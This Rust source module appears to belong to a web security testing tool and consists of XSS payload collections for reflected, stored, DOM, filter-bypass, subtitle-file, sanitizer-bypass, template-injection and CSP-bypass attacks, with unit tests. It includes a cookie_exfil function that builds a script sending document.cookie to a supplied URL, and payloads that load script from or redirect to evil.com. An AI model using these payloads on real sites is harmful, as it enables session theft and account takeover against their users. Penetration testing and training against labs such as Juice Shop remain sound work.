//! XSS (Cross-Site Scripting) payloads

/// XSS payload with metadata
#[derive(Debug, Clone)]
pub struct XssPayload {
    pub name: String,
    pub payload: String,
    pub category: XssCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XssCategory {
    Reflected,
    Stored,
    Dom,
    FilterBypass,
}

impl XssPayload {
    pub fn new(name: &str, payload: &str, category: XssCategory) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            category,
        }
    }
}

/// Basic XSS payloads
pub fn basic_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Script tag",
            "<script>alert('XSS')</script>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Img onerror",
            "<img src=x onerror=alert('XSS')>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Iframe",
            r#"<iframe src="javascript:alert('XSS')">"#,
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "SVG onload",
            "<svg onload=alert('XSS')>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Body onload",
            "<body onload=alert('XSS')>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Input onfocus",
            "<input onfocus=alert('XSS') autofocus>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "A href javascript",
            r#"<a href="javascript:alert('XSS')">click</a>"#,
            XssCategory::Reflected,
        ),
    ]
}

/// Filter bypass payloads
pub fn filter_bypass_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Case variation",
            "<ScRiPt>alert('XSS')</sCrIpT>",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "Double encoding",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "Null byte",
            "<scr\x00ipt>alert('XSS')</script>",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "HTML entities",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "Unicode",
            "\u{003c}script\u{003e}alert('XSS')\u{003c}/script\u{003e}",
            XssCategory::FilterBypass,
        ),
    ]
}

/// Generate XSS payload with custom script
pub fn custom_script(script: &str) -> String {
    format!("<script>{}</script>", script)
}

/// Generate cookie exfiltration payload
pub fn cookie_exfil(exfil_url: &str) -> String {
    format!(
        r#"<script>new Image().src='{}?c='+document.cookie</script>"#,
        exfil_url
    )
}

/// Basic XSS payloads as strings (for fuzzing)
pub fn basic_payloads_str() -> Vec<String> {
    basic_payloads().into_iter().map(|p| p.payload).collect()
}

/// HTML context-specific payloads
pub fn html_context_payloads() -> Vec<String> {
    vec![
        "<script>alert(1)</script>".to_string(),
        "<img src=x onerror=alert(1)>".to_string(),
        "<svg onload=alert(1)>".to_string(),
        "<body onload=alert(1)>".to_string(),
        "<iframe src=\"javascript:alert(1)\">".to_string(),
        "<input onfocus=alert(1) autofocus>".to_string(),
        "<marquee onstart=alert(1)>".to_string(),
        "<video src=x onerror=alert(1)>".to_string(),
        "<audio src=x onerror=alert(1)>".to_string(),
        "<details open ontoggle=alert(1)>".to_string(),
        "<math><maction actiontype=\"statusline#http://evil\">click".to_string(),
    ]
}

/// Attribute context-specific payloads
pub fn attribute_context_payloads() -> Vec<String> {
    vec![
        "\" onclick=alert(1)//".to_string(),
        "' onclick=alert(1)//".to_string(),
        "\" onfocus=alert(1) autofocus=\"".to_string(),
        "' onfocus=alert(1) autofocus='".to_string(),
        "\"><script>alert(1)</script>".to_string(),
        "'><script>alert(1)</script>".to_string(),
        "\" onmouseover=alert(1)//".to_string(),
        "javascript:alert(1)".to_string(),
        "\" style=animation-name:x onanimationend=alert(1)//".to_string(),
    ]
}

/// JavaScript context-specific payloads
pub fn javascript_context_payloads() -> Vec<String> {
    vec![
        "';alert(1)//".to_string(),
        "\";alert(1)//".to_string(),
        "</script><script>alert(1)//".to_string(),
        "\\';alert(1)//".to_string(),
        "\\\";alert(1)//".to_string(),
        "-alert(1)-".to_string(),
        "+alert(1)+".to_string(),
        "`${alert(1)}`".to_string(),
        "{{constructor.constructor('alert(1)')()}}".to_string(),
    ]
}

/// URL context-specific payloads
pub fn url_context_payloads() -> Vec<String> {
    vec![
        "javascript:alert(1)".to_string(),
        "data:text/html,<script>alert(1)</script>".to_string(),
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".to_string(),
        "vbscript:msgbox(1)".to_string(),
        "//evil.com".to_string(),
        "https://evil.com".to_string(),
    ]
}

/// Polyglot payloads that work in multiple contexts
pub fn polyglot_payloads() -> Vec<String> {
    vec![
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e".to_string(),
        "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>".to_string(),
        "'\"><img src=x onerror=alert(1)>".to_string(),
        "{{constructor.constructor('alert(1)')()}}".to_string(),
        "<svg/onload=alert(1)>".to_string(),
        "'-alert(1)-'".to_string(),
    ]
}

// =============================================================================
// VTT/Subtitle File XSS Payloads
// =============================================================================

/// VTT (WebVTT) subtitle file XSS payloads
///
/// These payloads exploit applications that process VTT subtitle files
/// without proper sanitization. Used in Juice Shop's video-xss challenge.
///
/// # Example
/// ```
/// use rectitude::payloads::xss::vtt_xss_payloads;
/// let payloads = vtt_xss_payloads();
/// assert!(!payloads.is_empty());
/// ```
pub fn vtt_xss_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "VTT script injection",
            "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n</script><script>alert('xss')</script>",
            XssCategory::Stored,
        ),
        XssPayload::new(
            "VTT img onerror",
            "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n<img src=x onerror=alert('xss')>",
            XssCategory::Stored,
        ),
        XssPayload::new(
            "VTT svg onload",
            "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n<svg onload=alert('xss')>",
            XssCategory::Stored,
        ),
        XssPayload::new(
            "VTT c tag injection",
            "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n<c.xss onclick=alert('xss')>click me</c>",
            XssCategory::Stored,
        ),
    ]
}

/// Generate a VTT file with XSS payload
///
/// Creates a valid WebVTT file structure with embedded XSS.
pub fn generate_vtt_xss(payload: &str) -> String {
    format!("WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n{}", payload)
}

/// SRT subtitle file XSS payloads
///
/// Similar to VTT but for SRT format.
pub fn srt_xss_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "SRT script injection",
            "1\n00:00:00,000 --> 00:00:10,000\n</script><script>alert('xss')</script>",
            XssCategory::Stored,
        ),
        XssPayload::new(
            "SRT img onerror",
            "1\n00:00:00,000 --> 00:00:10,000\n<img src=x onerror=alert('xss')>",
            XssCategory::Stored,
        ),
    ]
}

// =============================================================================
// Sanitization Bypass Payloads
// =============================================================================

/// Sanitization bypass payloads
///
/// These payloads are designed to bypass common HTML sanitizers
/// and XSS filters. Based on Juice Shop's "API-only XSS" challenge
/// and similar real-world bypasses.
///
/// # Example
/// ```
/// use rectitude::payloads::xss::sanitization_bypass_payloads;
/// let payloads = sanitization_bypass_payloads();
/// assert!(!payloads.is_empty());
/// ```
pub fn sanitization_bypass_payloads() -> Vec<XssPayload> {
    vec![
        // Nested tag bypass - sanitizer removes outer tags, inner remains
        XssPayload::new(
            "Nested script tags",
            "<<script>script>alert('xss')<</script>/script>",
            XssCategory::FilterBypass,
        ),
        // Incomplete tags
        XssPayload::new(
            "Incomplete iframe",
            "<iframe src=\"javascript:alert('xss')\"",
            XssCategory::FilterBypass,
        ),
        // Mutation XSS (mXSS)
        XssPayload::new(
            "mXSS backtick",
            "<img src=x onerror=`alert(1)`>",
            XssCategory::FilterBypass,
        ),
        // Self-closing tags
        XssPayload::new(
            "Self-closing script",
            "<script src=//evil.com/xss.js />",
            XssCategory::FilterBypass,
        ),
        // Event handler variations
        XssPayload::new(
            "onpointerenter",
            "<div onpointerenter=alert(1)>hover</div>",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "onfocusin",
            "<input onfocusin=alert(1) autofocus>",
            XssCategory::FilterBypass,
        ),
        // SVG-based
        XssPayload::new(
            "SVG animate",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "SVG set",
            "<svg><set onbegin=alert(1) attributeName=x to=y>",
            XssCategory::FilterBypass,
        ),
        // Math-based
        XssPayload::new(
            "MathML",
            "<math><maction actiontype=statusline#xss>XSS</maction></math>",
            XssCategory::FilterBypass,
        ),
        // Table-based
        XssPayload::new(
            "Table background",
            "<table background=\"javascript:alert(1)\">",
            XssCategory::FilterBypass,
        ),
        // Meta refresh
        XssPayload::new(
            "Meta refresh",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
            XssCategory::FilterBypass,
        ),
        // Object data
        XssPayload::new(
            "Object data",
            "<object data=\"javascript:alert(1)\">",
            XssCategory::FilterBypass,
        ),
        // Embed src
        XssPayload::new(
            "Embed src",
            "<embed src=\"javascript:alert(1)\">",
            XssCategory::FilterBypass,
        ),
    ]
}

/// DOM clobbering payloads
///
/// Payloads that exploit DOM clobbering vulnerabilities.
pub fn dom_clobbering_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Clobber document.domain",
            "<form id=document><input name=domain value=evil.com></form>",
            XssCategory::Dom,
        ),
        XssPayload::new(
            "Clobber window.name",
            "<iframe name=alert src=\"javascript:parent.alert(1)\">",
            XssCategory::Dom,
        ),
        XssPayload::new(
            "Clobber getElementById",
            "<img id=getElementById><img name=getElementById>",
            XssCategory::Dom,
        ),
    ]
}

/// Angular template injection payloads
///
/// For applications using AngularJS (1.x).
pub fn angular_template_payloads() -> Vec<String> {
    vec![
        "{{constructor.constructor('alert(1)')()}}".to_string(),
        "{{$on.constructor('alert(1)')()}}".to_string(),
        "{{$eval.constructor('alert(1)')()}}".to_string(),
        "{{a]].constructor('alert(1)')()}}".to_string(),
        "{{toString.constructor('alert(1)')()}}".to_string(),
        "{{constructor.constructor('alert(document.domain)')()}}".to_string(),
    ]
}

/// React dangerouslySetInnerHTML bypass payloads
pub fn react_bypass_payloads() -> Vec<String> {
    vec![
        "{\"__html\": \"<img src=x onerror=alert(1)>\"}".to_string(),
        "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}/>".to_string(),
    ]
}

/// CSP bypass payloads
///
/// Payloads that may work even with Content-Security-Policy in place.
pub fn csp_bypass_payloads() -> Vec<XssPayload> {
    vec![
        // JSONP callback abuse
        XssPayload::new(
            "JSONP callback",
            "<script src=\"/api/data?callback=alert\"></script>",
            XssCategory::FilterBypass,
        ),
        // Base tag injection
        XssPayload::new(
            "Base tag hijack",
            "<base href=\"https://evil.com/\"><script src=\"/js/app.js\"></script>",
            XssCategory::FilterBypass,
        ),
        // Angular CDN in unsafe-eval
        XssPayload::new(
            "Angular with unsafe-eval",
            "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
            XssCategory::FilterBypass,
        ),
        // Object tag bypass
        XssPayload::new(
            "Object tag data URI",
            "<object data=\"data:text/html,<script>alert(1)</script>\">",
            XssCategory::FilterBypass,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_payloads() {
        let payloads = basic_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("alert")));
    }

    #[test]
    fn test_html_context_payloads() {
        let payloads = html_context_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_polyglot_payloads() {
        let payloads = polyglot_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_vtt_xss_payloads() {
        let payloads = vtt_xss_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.payload.starts_with("WEBVTT")));
        assert!(payloads.iter().any(|p| p.payload.contains("script")));
    }

    #[test]
    fn test_generate_vtt_xss() {
        let vtt = generate_vtt_xss("<script>alert(1)</script>");
        assert!(vtt.starts_with("WEBVTT"));
        assert!(vtt.contains("<script>"));
        assert!(vtt.contains("00:00:00.000"));
    }

    #[test]
    fn test_sanitization_bypass_payloads() {
        let payloads = sanitization_bypass_payloads();
        assert!(!payloads.is_empty());
        assert!(
            payloads
                .iter()
                .all(|p| p.category == XssCategory::FilterBypass)
        );
    }

    #[test]
    fn test_dom_clobbering_payloads() {
        let payloads = dom_clobbering_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == XssCategory::Dom));
    }

    #[test]
    fn test_angular_template_payloads() {
        let payloads = angular_template_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.contains("constructor")));
    }

    #[test]
    fn test_csp_bypass_payloads() {
        let payloads = csp_bypass_payloads();
        assert!(!payloads.is_empty());
    }
}
